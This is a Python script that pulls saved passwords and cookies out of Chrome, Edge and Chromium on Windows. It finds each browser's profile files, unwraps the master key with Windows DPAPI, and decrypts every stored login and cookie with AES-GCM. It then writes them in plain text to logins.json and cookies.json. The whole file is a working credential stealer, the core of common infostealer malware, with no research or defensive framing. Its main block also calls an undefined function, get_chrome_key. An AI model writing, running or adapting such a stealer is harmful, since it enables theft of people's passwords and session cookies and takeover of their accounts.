import sqlite3
from os import getenv
import os
from Crypto.Cipher import AES
from win32 import win32crypt
import json
import base64
from shutil import copyfile


def win_decrypt(encrypted_key):
    decrypted_value = win32crypt.CryptUnprotectData(
        encrypted_key, None, None, None, 0)[1]
    return decrypted_value


def chrome_80_decrypt(encrypted, chrome_key):
    nonce = encrypted[3:15]
    cipher = AES.new(chrome_key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt(encrypted[15:])
    return decrypted[:-16].decode()


def chromnium_exists():
    LOCAL = os.environ['LOCALAPPDATA']
    return os.path.exists(f"{LOCAL}/Chromium/User Data")


def edge_exists():
    LOCAL = os.environ['LOCALAPPDATA']
    return os.path.exists(f"{LOCAL}/Microsoft/Edge/User Data")


def chrome_exists():
    LOCAL = os.environ['LOCALAPPDATA']
    return os.path.exists(f"{LOCAL}/Google/Chrome/User Data")


def get_chrome_directories():
    LOCAL = os.environ['LOCALAPPDATA']
    chrome_dir = f"{LOCAL}/Google/Chrome/User Data/"
    key_directory = f"{chrome_dir}/Local State"
    cookie_directory = f"{chrome_dir}/Default/Cookies"
    login_directory = f"{chrome_dir}/Default/Login Data"

    return key_directory, cookie_directory, login_directory


def get_edge_directories():
    LOCAL = os.environ['LOCALAPPDATA']
    edge_dir = f"{LOCAL}/Microsoft/Edge/User Data/"
    key_directory = f"{edge_dir}/Local State"
    cookie_directory = f"{edge_dir}/Default/Cookies"
    login_directory = f"{edge_dir}/Default/Login Data"

    return key_directory, cookie_directory, login_directory


def get_chromium_directories():
    LOCAL = os.environ['LOCALAPPDATA']
    chromium_dir = f"{LOCAL}/Chromium/User Data/"
    key_directory = f"{chromium_dir}/Local State"
    cookie_directory = f"{chromium_dir}/Default/Cookies"
    login_directory = f"{chromium_dir}/Default/Login Data"

    return key_directory, cookie_directory, login_directory


def get_encryption_key(key_directory):
    with open(key_directory, "r") as f:
        encryption_key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win_decrypt(base64.b64decode(encryption_key)[5:])


def get_cookies(directory, key):
    new_file = f"{directory}.bak"
    copyfile(directory, new_file)
    conn = sqlite3.connect(new_file)
    cursor = conn.cursor()
    query = "SELECT host_key, name, value, encrypted_value FROM cookies"
    cursor.execute(query)
    results = cursor.fetchall()
    cookies = {}
    for url, name, value, encrypted in results:
        if url not in cookies:
            cookies[url] = []
        if value or encrypted[:3] == b"v10":
            decrypted = chrome_80_decrypt(encrypted, key)
        else:
            decrypted = win_decrypt(encrypted)
        cookie_obj = {}
        cookie_obj["name"] = name
        cookie_obj["value"] = decrypted
        cookie_obj["domain"] = url
        cookies[url].append(cookie_obj)
    conn.close()
    return cookies


def get_logins(directory, key):
    new_file = f"{directory}.bak"
    copyfile(directory, new_file)
    conn = sqlite3.connect(new_file)
    cursor = conn.cursor()
    query = "SELECT action_url, username_value, password_value FROM logins"
    cursor.execute(query)
    results = cursor.fetchall()
    logins = {}
    for url, username, encrypted in results:
        if url not in logins:
            logins[url] = []
        if encrypted[:3] == b"v10":
            decrypted = chrome_80_decrypt(encrypted, key)
        else:
            decrypted = win_decrypt(encrypted)
        login_obj = {}
        login_obj["name"] = username
        login_obj["value"] = decrypted
        logins[url].append(login_obj)
    conn.close()
    return logins


def save_data(logins=False, cookies=False):
    save_details = [
        [
            logins,
            "logins.json"
        ],
        [
            cookies,
            "cookies.json"
        ]
    ]
    for data in save_details:
        if data[0]:
            with open(data[1], "w") as f:
                json.dump(data[0], f, sort_keys=True, indent=4)


if __name__ == "__main__":
    key_directory, cookie_directory, login_directory = get_chrome_directories()
    chrome_key = get_chrome_key(key_directory)
    cookies = get_cookies(cookie_directory, chrome_key)
    logins = get_logins(login_directory, chrome_key)
    save_data(logins=logins, cookies=cookies)
